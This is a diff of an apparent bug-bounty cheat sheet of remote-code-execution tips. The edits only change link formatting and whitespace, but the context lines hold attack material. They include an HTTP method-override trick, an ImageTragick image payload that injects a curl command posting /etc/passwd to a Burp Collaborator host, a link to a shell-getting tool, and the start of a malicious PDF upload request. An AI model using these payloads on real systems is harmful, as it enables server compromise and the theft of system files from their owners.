@@ -6,7 +6,7 @@
     
 ## TIP-2 
 
-  If server only allows GET and POST method, then try adding “X-HTTP-Method -Override: PUT to achieve RCE via PUT method.
+    If server only allows GET and POST method, then try adding “X-HTTP-Method -Override: PUT to achieve RCE via PUT method.
   
   
 ## TIP-3 
@@ -18,11 +18,11 @@
     push graphic-context viewbox 0 0 200 200 fill 'url(https://example.123 "|curl -d "@/etc/passwd" -X POST https://xxx.burpcollaborator.net/test1")' pop graphic-context
     
 
-    [https://github.com/vishwaraj101/imagetragick](This Tool imgetragick get shell)
+   (https://github.com/vishwaraj101/imagetragick)[This Tool imgetragick get shell]
     
 ## TIP-4 
 
-    (RCE on PDF upload:)[https://twitter.com/huntmost/status/1192670565963911169]
+   [RCE on PDF upload:](https://twitter.com/huntmost/status/1192670565963911169)
 
     Content-Disposition: form-data; name="fileToUpload"; filename="pwn.pdf"
     Content-Type: application/pdf
